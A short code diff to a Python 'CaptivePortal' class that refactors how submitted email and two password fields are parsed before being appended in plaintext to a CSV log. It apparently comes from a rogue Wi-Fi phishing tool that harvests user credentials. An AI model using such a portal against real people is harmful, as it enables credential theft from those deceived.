@@ -13,11 +13,9 @@ class CaptivePortal:
       return f.read()
 
   def log_credentials(self, request):
-    request_data = request.split('a=')[1]
-    parameters = request_data.split('&')
-    email = parameters[0].replace('%40', '@')
-    pass1 = parameters[1].replace('b=', '')
-    pass2 = parameters[2].replace('c=', '')
+    email = request['email'].replace('%40', '@')
+    pass1 = request['pass1']
+    pass2 = request['pass2']
     entry = '%s,%s,%s\n' % (email, pass1, pass2)
     with open('data/captive_portal/log.csv', 'a') as f:
       f.write(entry)
